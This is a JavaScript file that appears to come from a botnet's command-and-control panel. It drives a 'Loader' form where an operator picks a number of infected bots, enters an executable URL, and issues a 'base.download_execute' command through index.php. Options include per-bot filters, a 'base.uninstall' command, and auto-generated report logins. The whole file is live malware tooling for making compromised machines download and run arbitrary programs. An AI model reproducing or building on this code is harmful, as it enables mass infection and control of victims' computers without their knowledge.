
$(document).ready(function() {
	$("#Loader_Control_Slider").disableSelection();
	$("#Loader_Control_InnerSlider").disableSelection();
});

function onMouse_InnerSlider(event){
	//alert('ayo2');
	//console.debug(event);
}
var mouseState=0;

function onMouse_Slider(event){
	var x;
	if (event.layerX) {
		x = event.layerX - 2;
	} else {
		x = event.x - 2;
	}
	if(Math.round((x / 96) * 100) > 100 || Math.round((x / 96) * 100) < 1) {
		return;
	}
	$("#Loader_Control_InnerSlider").css("width", x + "px");
	$("#Loader_Bots").val(Math.round(((x / 96) * totalbots)));
}
function onMouse_SliderBegin(event){
	mouseState=1;
}
function onMouse_SliderMove(event) {
	if (mouseState == 1) {
		onMouse_Slider(event);
	}
}
function onMouse_SliderEnd(event) {
	mouseState=0;
}


function processLoader(frm){
	if ($("#Loader_LoadURL").val().length < 1) {
		alert('You must enter a load URL.\r\nFor example, you may use "http://www.cia.gov/lolwut.exe".');
		return false;
	}
	if ($("#Loader_Bots").val() < 1) {
		alert('You must use more than 0 bots to load your exe onto your bots.');
		return false;
	}
	if (!(!isNaN(parseFloat($("#Loader_Bots").val())) && isFinite($("#Loader_Bots").val()))) {
		alert('You must use a number!');
		return false;
	}
	var commandstring;
	var poststring = '';
	var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
	var string_length = 24;
	var randomstring = '';
	var filters = new Array();
	commandstring = "base.download_execute ";
	for (var i = 0; i < string_length; i++) {
		var rnum = Math.floor(Math.random() * chars.length);
		randomstring += chars.substring(rnum, rnum + 1);
	}
	commandstring += randomstring;
	commandstring += ".exe ";
	commandstring += $("#Loader_LoadURL").val();
	poststring += "&submit=1&command=" + escape(commandstring) + "&commandquota=" + $("#Loader_Bots").val();
	//poststring += $("#Loader_Filters").val();
	if ($("#Loader_Filters").val().length > 1) {
		filters = escape($("#Loader_Filters").val()).split(escape(";"));
		poststring += "&filters[]=" + filters.join("&filters[]=");
	}
	//alert($("#Loader_StatusPage").attr("checked"));
	var mCreateReport=false;
	var mQuota;
	var mUpdate=false;
	var mUsername='';
	var mPassword='';
	mUpdate = $("#Loader_Update").attr("checked");
	mCreateReport = $("#Loader_StatusPage").attr("checked");
	mQuota = $("#Loader_Bots").val();
	$("#desktop-window-loader-content").html("Loading...");

	$.ajax({ async:true, url: "index.php?p=IssueCommand", type: "POST", data: poststring, success: function(data) {
		//alert(data);
		// Now let's create a new user with the command ID :)

		if(mCreateReport) {
			// goahead and create temporary user.
			for (var i = 0; i < 12; i++) {
				var rnd1=Math.floor(Math.random() * chars.length);
				var rnd2=Math.floor(Math.random() * chars.length);
				mUsername += chars.substring(rnd1, rnd1 + 1);
				mPassword += chars.substring(rnd2, rnd2 + 1);
			}
			var d = new Date();
			mUsername = mUsername + d.getUTCDay() +  d.getUTCMilliseconds();
			if(mUpdate) {
				$.ajax({async: true,url: "index.php?p=IssueCommand",type: "POST", data:"&submit=1&command=base.uninstall&commandquota=" + mQuota});

			}
			$.ajax({
				async: true,
				url: "index.php?p=UICreateReport&notemplate=1",
				type: "POST",
				data: {
					Username: mUsername,
					Password: mPassword,
					CommandID: data
				},
				success: function(data){
					if(data.substr(0, 2) == "OK") {
						$("#desktop-window-loader-content").html("Successfully added Load to Task Queue.<br />" + 
							"To view the status of the Task, login using the following information:<br /><br />" + 
							"Username: <b>"+mUsername+"</b><br />Password: <b>"+mPassword+"</b><br /><br />" +
							"<a href=\"javascript:void(0)\" onclick=\"Loader_Reload()\">Click here</a> to add another load.");
					} else {
						$("#desktop-window-loader-content").html("Error <br \>" + escape(data));
					}
				}
			});
		} else {
			$("#desktop-window-loader-content").html("Successfully added Load to Task Queue.<br />" + 
			"<a href=\"javascript:void(0)\" onclick=\"Loader_Reload()\">Click here</a> to add another load.");
		}
		
	}});
	return false;
}
function Loader_Reload() {
	showWindow('loader');
}
